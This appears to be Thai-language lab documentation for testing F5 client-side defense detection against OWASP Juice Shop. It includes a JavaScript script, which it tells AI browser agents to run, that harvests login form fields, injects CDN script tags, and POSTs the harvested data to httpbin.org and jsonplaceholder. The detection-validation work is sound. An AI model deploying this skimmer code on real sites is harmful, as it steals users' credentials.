เฟส 2 สร้างทราฟฟิกการโจมตีจำลองต่อแอปพลิเคชันที่ได้รับการป้องกัน และยืนยันว่า CSD ตรวจจับได้ เฟส 1 ต้องเสร็จสมบูรณ์ — การตรวจสอบขั้นตอนที่ 7 ทั้งหมดต้อง PASS — ก่อนดำเนินการต่อ

## ขั้นตอนที่ 8: การจำลองการโจมตี

<Aside type="note">
ขั้นตอนนี้ต้องมีการเรียกใช้ JavaScript ฝั่งเบราว์เซอร์ — `curl` ไม่สามารถกระตุ้นการตรวจจับของ CSD ได้ ผู้ช่วย AI ที่มีเครื่องมือ browser automation (MCP Chrome DevTools, Playwright, Puppeteer) จะเรียกใช้ขั้นตอนเหล่านี้โดยตรงโดยใช้ลำดับ **การดำเนินการอัตโนมัติด้วย AI** ด้านล่าง ผู้ดำเนินการที่ไม่มี browser automation ให้ทำขั้นตอนแบบ manual
</Aside>

หลังจากยืนยันโครงสร้างพื้นฐานแล้ว (การตรวจสอบขั้นตอนที่ 7 ของเฟส 1 ทั้งหมด PASS) ให้เรียกใช้สคริปต์จำลองการโจมตีเพื่อสร้างการตรวจจับของ CSD สคริปต์เหล่านี้ถูกกำหนดไว้ในคู่มือ [การกระตุ้นการตรวจจับ](/csd/trigger-detection/) และ [คลังสคริปต์โจมตี](/csd/attack-scripts/)

### การดำเนินการอัตโนมัติด้วย AI

ผู้ช่วย AI ที่มีเครื่องมือ browser automation จะเรียกใช้การจำลองการโจมตีแบบ programmatic:

1. **นำทางด้วย initScript** — นำทางไปยัง `about:blank` ก่อนเพื่อให้แน่ใจว่ามี document context ที่สะอาด (หลีกเลี่ยง initScripts ที่ค้างจากการนำทางก่อนหน้า) จากนั้น `navigate_page` ไปยัง `http://$F5XC_DOMAINNAME/#/login` พร้อม `initScript` ที่บันทึก `setInterval`, `clearInterval`, `fetch` และ `console.log` แบบ native ก่อนที่ zone.js จะ patch ทำการ poll ฟิลด์แบบฟอร์มเข้าสู่ระบบ กรอกข้อมูลประจำตัวผ่าน native `HTMLInputElement.prototype.value` setter และเรียกใช้ Combined Detection Script แบบ inline ทันที ใช้ initScript ตามตัวอักษรด้านล่าง
2. **ปิด Welcome Banner** — `press_key` ด้วย `Escape` เพื่อปิด Welcome Banner ในการเข้าชมครั้งถัดไป banner อาจไม่ปรากฏ (คุกกี้ถูกเก็บไว้) กล่องขอความยินยอมคุกกี้จะถูกปิดโดยอัตโนมัติด้วยปุ่ม Escape
3. **รอจนเสร็จสมบูรณ์** — รอ 10 วินาทีเพื่อให้ CDN script load/error callbacks และ fetch promise resolutions ทั้งหมดเสร็จสมบูรณ์
4. **บันทึกหลักฐาน** — `list_console_messages` เพื่อตรวจสอบ `[CSD Demo] Simulation complete` และผลลัพธ์การโหลด CDN; `list_network_requests` กรองตามประเภท `script` และ `fetch` เพื่อยืนยัน HTTP status codes (`200`/`201` สำหรับสำเร็จ, `pending` สำหรับ request ที่ถูกค้างไว้)

**initScript ของเฟส 2 (ตามตัวอักษร — ใช้ตามที่เขียนไว้):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**ความไม่เข้ากันของ zone.js** — Juice Shop ใช้ zone.js ของ Angular ซึ่ง patch `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` และ browser API อื่นๆ สิ่งนี้ทำให้เครื่องมือ MCP `evaluate_script`, `fill` และ `click` เกิดข้อผิดพลาด `Cannot read properties of undefined (reading 'call')` ให้ใช้ `navigate_page` พร้อม `initScript` แทน — `initScript` ทำงานก่อน zone.js โหลด ดังนั้นคุณสามารถบันทึก native API references และใช้ใน polling callbacks ได้ initScript ต้องกรอกฟิลด์แบบฟอร์มโดยใช้ native `HTMLInputElement.prototype.value` setter (ไม่ใช่ `fill`) และเรียกใช้ detection script แบบ inline (ไม่ใช่ผ่าน `setTimeout` ซึ่ง zone.js อาจดักจับหลังจากโหลดหน้า) ดู [การกระตุ้นการตรวจจับ — การดำเนินการอัตโนมัติด้วย AI](/csd/trigger-detection/#ai-automated-execution) สำหรับรายละเอียด
</Aside>

<Aside type="note">
**การสะสมของ initScript** — การเรียก `navigate_page` แต่ละครั้งพร้อมพารามิเตอร์ `initScript` จะเพิ่มสคริปต์เข้าไปในรายการถาวรที่ทำงานในทุกการโหลดเอกสารครั้งถัดไป เพื่อหลีกเลี่ยงสคริปต์ค้างที่รบกวน ให้นำทางไปยัง `about:blank` ระหว่างการรัน หรือใช้ `new_page` พร้อม `isolatedContext` สำหรับ browser context ที่สะอาด
</Aside>

<Aside type="note">
**การบันทึก native `fetch` ใน initScript** — initScript บันทึก `window.fetch.bind(window)` ก่อนที่ zone.js จะ patch สิ่งนี้ทำให้การเรียก fetch ทำงานได้อย่างถูกต้องโดยไม่มีข้อผิดพลาด `Cannot read properties of undefined` ของ zone.js initScript เดียวกัน (ที่มี native `fetch` ที่บันทึกไว้) ใช้สำหรับทั้งการรันการโจมตีเฟส 2 และเฟส 3 — การบรรเทาผลกระทบของ CSD ไม่ดักจับการเรียก `fetch()` ดังนั้นการบันทึก native reference จึงไม่ส่งผลต่อพฤติกรรมการบรรเทาผลกระทบ
</Aside>

<Aside type="caution">
**Origin 404 ชั่วคราว** — ในการนำทางครั้งแรกไปยังแอปพลิเคชัน Angular `polyfills.js` หรือสคริปต์แอปอื่นๆ อาจส่งคืน HTTP 404 ชั่วคราวจาก origin server สิ่งนี้ทำให้ Angular ไม่สามารถ bootstrap ได้ ส่งผลให้หน้าว่างไม่มีแบบฟอร์มเข้าสู่ระบบ 404 เป็นแบบชั่วคราว — request ครั้งถัดไปจะส่งคืน 200 หรือ 304 **การกู้คืน:** นำทางไปยัง `about:blank` รอ 2 วินาที จากนั้นลองนำทางอีกครั้ง หากปัญหายังคงอยู่หลังจากลองหลายครั้ง ให้ตรวจสอบสุขภาพ origin ผ่านเส้นทาง load balancer (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`)
</Aside>

### การดำเนินการแบบ Manual

ผู้ดำเนินการที่ไม่มีเครื่องมือ browser automation ให้ทำขั้นตอนเหล่านี้ด้วยตนเอง:

1. **นำทาง** ไปยังหน้าเข้าสู่ระบบของแอปพลิเคชันที่ได้รับการป้องกัน: `http://xF5XC_DOMAINNAMEx/#/login`
2. **กรอกข้อมูลประจำตัวจำลอง** — พิมพ์ `test@example.com` ในฟิลด์ Email และ `P@ssword123` ในฟิลด์ Password (อย่าส่งแบบฟอร์ม)
3. **เปิด DevTools** — กด **F12** และสลับไปที่แท็บ **Console**
4. **เรียกใช้ Combined Detection Script** — วาง สคริปต์จาก [การกระตุ้นการตรวจจับ &mdash; เรียกใช้สคริปต์จำลองแบบรวม](/csd/trigger-detection/#run-the-combined-simulation-script) ลงในคอนโซลแล้วกด Enter
5. **ยืนยันผลลัพธ์ในคอนโซล** — ยืนยันว่าผลลัพธ์แบบเป็นเฟสของ `[CSD Demo]` แสดง: การเก็บเกี่ยวฟิลด์, การฉีดสคริปต์จาก 4 CDN domains และการดึงข้อมูลออกไปยัง 2 endpoints

### สิ่งที่ถูกกระตุ้น

| สัญญาณ | พฤติกรรม | การตรวจจับ |
| --- | --- | --- |
| การเก็บเกี่ยวฟิลด์แบบฟอร์ม | อ่านค่า input ของอีเมลและรหัสผ่าน | สคริปต์ที่อ่านฟิลด์แบบฟอร์มที่ละเอียดอ่อน — ถูกตั้งค่าสถานะเป็น High Risk |
| การฉีดสคริปต์ | ฉีด 4 แท็ก `&lt;script&gt;` จาก `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | ตรวจพบโดเมนสคริปต์บุคคลที่สามใหม่สูงสุด 4 รายการ (ความพร้อมใช้งานของ CDN แตกต่างกัน) |
| การดึงข้อมูลออก | ส่งข้อมูลที่เก็บเกี่ยวผ่าน `fetch` ไปยัง `www.httpbin.org` และ `jsonplaceholder.typicode.com` | การเรียกเครือข่ายไปยังโดเมนภายนอก |

<Aside type="note">
**ความพร้อมใช้งานของ CDN แตกต่างกัน** ไม่ใช่ CDN scripts ทั้ง 4 ตัวจะโหลดได้ในทุกการรัน — ข้อจำกัดทรัพยากรเบราว์เซอร์ สภาพเครือข่าย หรือการ throttling ของ CDN อาจทำให้บางตัวล้มเหลวด้วย `ERR_INSUFFICIENT_RESOURCES` หรือ timeout การจำลองสำเร็จหาก CDN script **ใดก็ตาม** โหลดได้ CSD ตรวจจับความพยายามในการฉีดไม่ว่าสคริปต์จะโหลดสำเร็จหรือไม่ — การสร้างแท็ก `&lt;script&gt;` นั้นเองเป็นสัญญาณการตรวจจับ

ในกรณีรุนแรง `ERR_INSUFFICIENT_RESOURCES` อาจลุกลามเป็นความล้มเหลวระดับหน้า — ทั้งหน้าว่างเปล่า screenshots timeout และ `take_snapshot` ล้มเหลว สิ่งนี้มักเกิดขึ้นหลังจากการนำทางหลายครั้งที่มี initScripts หนักสะสมในบริบทเบราว์เซอร์เดียวกัน **การกู้คืน:** ใช้ `new_page` พร้อม `isolatedContext` เพื่อสร้างบริบทเบราว์เซอร์ใหม่ จากนั้นลองอีกครั้งจากลำดับ `about:blank` → `navigate_page` พร้อม initScript สิ่งนี้แตกต่างจากความล้มเหลวของ CDN script แต่ละตัว ซึ่งไม่ส่งผลต่อความสำเร็จของการจำลอง
</Aside>

<Aside type="tip">
หลังจากเรียกใช้การจำลองการโจมตี ให้ใช้ polling loop แบบกำหนดไว้เพื่อรอการตรวจจับ:

1. Query `/detected_domains` ทุก 60 วินาที
2. หาก DET-3 ผ่าน (โดเมน exfil ปรากฏใน `/detected_domains`) ให้ดำเนินการต่อไปยังขั้นตอนที่ 9 ทันที
3. หากยังว่างอยู่หลังจาก 10 queries (10 นาที) ให้ตรวจสอบสถานะ CSD (ขั้นตอนที่ 5 ของเฟส 1) และการลงทะเบียนโดเมนที่ได้รับการป้องกัน (ขั้นตอนที่ 6 ของเฟส 1) — หนึ่งในนี้อาจกำหนดค่าผิด
4. หากยังว่างอยู่หลังจาก 30 queries (30 นาที) ให้หยุดและรายงานให้ผู้ดำเนินการ — อย่าดำเนินการต่อไปยังเฟส 3

สำหรับการจำลองแบบเจาะจงเพิ่มเติม (หมวดหมู่การโจมตีแต่ละรายการ, การทดสอบความเครียดการตรวจจับสูงสุด) ดู [คลังสคริปต์โจมตี](/csd/attack-scripts/)
</Aside>

### หลักฐาน

ผู้ช่วย AI ควรรายงานสิ่งต่อไปนี้ สำหรับการดำเนินการอัตโนมัติด้วย AI หลักฐานจะถูกบันทึกแบบ programmatic ผ่าน `list_console_messages` (ฟังก์ชัน polling ของ initScript บันทึกผลลัพธ์ไปยังคอนโซล) สำหรับการดำเนินการแบบ manual ผู้ดำเนินการจะอ่านผลลัพธ์ในคอนโซลเบราว์เซอร์

| การตรวจสอบ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| โหลดหน้าเข้าสู่ระบบแล้ว | `200 OK` ที่ `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| สคริปต์คอนโซลทำงานแล้ว | `[CSD Demo] Simulation complete` ในผลลัพธ์คอนโซล | PASS / FAIL |
| เก็บเกี่ยวฟิลด์แล้ว | จำนวน &gt; 0 ในผลลัพธ์คอนโซล | PASS |
| ฉีดสคริปต์แล้ว | 1–4 CDN domains ในผลลัพธ์คอนโซล (บางตัวอาจล้มเหลวด้วยข้อผิดพลาดทรัพยากร) | PASS หาก CDN domain ใดก็ตามปรากฏ |
| ช่องทาง Exfil | ความพยายาม fetch POST 2 ครั้งในผลลัพธ์คอนโซล | PASS |

<Aside type="tip">
หาก HTTPS LB certificate ถูกต้อง (`CertificateValid`) คุณอาจเลือกรันการจำลองกับ `https://$F5XC_DOMAINNAME/#/login` ด้วยก็ได้ สิ่งนี้ไม่จำเป็นสำหรับการดำเนินการสาธิต
</Aside>

## ขั้นตอนที่ 9: การยืนยันการตรวจจับผ่าน API

Query CSD API endpoints เพื่อยืนยันว่าการตรวจจับปรากฏขึ้น ใช้ polling loop: query `/detected_domains` ทุก 60 วินาที; ดำเนินการต่อทันทีที่ DET-3 ผ่าน หาก DET-3 ไม่ผ่านหลังจาก 10 นาที ให้ตรวจสอบการกำหนดค่า CSD หาก DET-3 ไม่ผ่านหลังจาก 30 นาที ให้หยุดและรายงานให้ผู้ดำเนินการ endpoints เหล่านี้มีเอกสารอยู่ใน [เอกสารอ้างอิง API](/csd/api-reference/) และใช้การยืนยันตัวตนและ namespace เดียวกับขั้นตอนก่อนหน้า

<Aside type="note">
**ลำดับการประมวลผล endpoint:** `/detected_domains` ถูกเติมข้อมูลก่อนและเป็นตัวบ่งชี้หลักว่า CSD pipeline ทำงานอยู่ `/scripts` และ `/formFields` ถูกเติมข้อมูลตามกำหนดการประมวลผลแบ็กเอนด์ที่ช้ากว่าและอาจยังว่างอยู่เป็นเวลา 20–30 นาทีแม้หลังจากรันการจำลองหลายครั้ง หาก `/detected_domains` แสดงโดเมน exfil (`www.httpbin.org`, `jsonplaceholder.typicode.com`) ให้ถือว่าการจำลองถูกตรวจจับสำเร็จและดำเนินการต่อ — การตรวจสอบ DET-1 ด้านล่างสะท้อนสิ่งนี้
</Aside>

### สคริปต์ที่ตรวจพบ

Query สคริปต์ที่ตรวจพบใน 24 ชั่วโมงที่ผ่านมา:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total` | &gt; 0 (ตรวจพบสคริปต์) | PASS หาก &gt; 0; PENDING หากเป็น 0 แต่ `/detected_domains` แสดงโดเมน exfil |
| ชื่อสคริปต์ | รวม CDN domains (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) ใน `script_name` | PASS หาก CDN domains ที่ฉีดปรากฏ |

### โดเมนที่ตรวจพบ

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total_domains` | &gt; 0 | PASS หาก &gt; 0 |
| รายการโดเมน | รวมโดเมน CDN และ exfil | PASS หากโดเมนที่คาดหวังปรากฏ |

### ฟิลด์แบบฟอร์ม

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total` | &gt; 0 | PASS หาก &gt; 0; PENDING หากเป็น 0 แต่ DET-3 ผ่าน |
| `name` | รวม `email`, `password` | PASS หากฟิลด์ที่ละเอียดอ่อนปรากฏ |
| `sensitivity` | `Sensitive` สำหรับฟิลด์ email/password | PASS หาก ML จัดประเภทถูกต้อง |

<Aside type="note">
**การประมวลผลฟิลด์แบบฟอร์มช้ากว่าการตรวจจับโดเมน** endpoint `/formFields` อาจส่งคืนฟิลด์ที่มี metadata ไม่ครบถ้วนในการ query ครั้งแรก การจัดประเภทความละเอียดอ่อนของ ML (`Sensitive` vs `Not Sensitive`) จะเติมข้อมูลหลังจากการประมวลผลแบ็กเอนด์เสร็จสมบูรณ์ — อาจใช้เวลา 20–30 นาทีหลังจากรันการจำลองครั้งแรก หากฟิลด์แสดงแต่ยังไม่มีการจัดประเภท ให้ query อีกครั้งภายหลัง DET-3 (`/detected_domains`) เป็นเกณฑ์การผ่านหลัก
</Aside>

### สรุปหลักฐานเฟส 2

หลังจาก detection queries ทั้งหมด ให้แสดงสถานะการตรวจจับสุดท้าย:

| รหัสทดสอบ | การตรวจสอบ | สถานะ |
| --- | --- | --- |
| DET-1 | ตรวจพบสคริปต์ (endpoint `/scripts`) | PASS หาก &gt; 0; PENDING หากว่างแต่ DET-3 ผ่าน |
| DET-2 | ตรวจพบ CDN domains | PASS / FAIL |
| DET-3 | ตรวจพบโดเมน exfil (endpoint `/detected_domains`) | **ตัวบ่งชี้หลัก** — PASS หาก `www.httpbin.org` หรือ `jsonplaceholder.typicode.com` ปรากฏ |
| DET-4 | ตรวจพบฟิลด์แบบฟอร์ม (endpoint `/formFields`) | PASS หาก &gt; 0; PENDING หากว่างแต่ DET-3 ผ่าน |

<Aside type="note">
**เกณฑ์การผ่านขั้นต่ำเพื่อดำเนินการต่อไปยังเฟส 3:** DET-3 ต้อง PASS (โดเมน exfil มองเห็นได้ใน `/detected_domains`) DET-1 และ DET-4 อาจแสดง PENDING ในการใช้งานครั้งแรกหรือหลังจาก rebuild ใหม่ — สิ่งนี้เป็นเรื่องปกติ หาก DET-3 แสดง FAIL ด้วยหลังจาก 30 นาที ให้ยืนยันว่า CSD เปิดใช้งานอยู่ (ขั้นตอนที่ 5 ของเฟส 1) โดเมนที่ได้รับการป้องกันลงทะเบียนแล้ว (ขั้นตอนที่ 6 ของเฟส 1) และ CSD JS tag ถูกฉีดเข้าไป (การตรวจสอบ JS Configuration ของขั้นตอนที่ 7 เฟส 1)
</Aside>
